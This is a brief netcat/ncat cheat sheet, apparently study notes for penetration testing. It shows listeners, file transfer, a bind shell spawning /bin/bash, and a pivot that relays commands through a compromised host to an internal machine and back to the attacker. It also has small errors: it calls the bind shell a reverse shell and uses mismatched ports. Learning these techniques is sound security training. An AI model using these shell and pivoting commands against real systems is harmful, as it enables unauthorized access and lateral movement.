**Listener**:
`nc -vlp 1234`
Opens port 1234 in our machine

**Connect**:
`nc -nv 127.0.0.1 1234`
connect to localhost on port 1234

---

### File Transfer:

**Attacker**:
`nc -vlp 1234 < test.txt`
When anyone connect to our server , then test.txt is sent.

**Victim**:
`nc -nv 127.0.0.1 1234 > sample.txt`
Here we will receive the test.txt and will be stored in sample.txt

Using this we can transfer files between machines.

### Emulate Bind Shell:

**Victim**:
`ncat -vlp 123 -e /bin/bash`

Ncat is a advanced version of nc and developed by nmap.
For using ncat ,nmap has to be installed in the machine.
With ncat we can use -e flag to get a reverse shell.


**Attacker**:
`nc -nv 127.0.0.1 1234`
Now you can execute any commands like ls, pwd etc.

### Pivoting Simulation:
- Requires access to all 3 machines for this scenario.

Machines:
1. Attacker
2. Victim-1 (Compromised)
3. Victim-2 (Internal Host)

**Victim-2**:
`ncat -vlp 4444 -e /bin/bash`

**Attacker Terminal 1**:
`nc -nv <victim-1-ip> 1234`
This will connect to Victim-1 and from here we can send commands.
Here we send **ls** command.

**Attacker Terminal 2**:
`nc -vlp 5555`
It is to receive the output from Victim-2 --> Victim-1 --> our machine.

**Victim-1**:
`nc -vlp 1234 | nc -nv <victim-2-ip> 4444 | nc -nv <attacker-ip> 5555`
- Here we will receive the **ls** command
- Then we send that command to victim-2 machine by using pipe.
- After that it will get executed in victim-2.
- Output is sent to victim-1 and that is again sent to attacker port 5555.

You will get the output in **Attacker Terminal 2**.
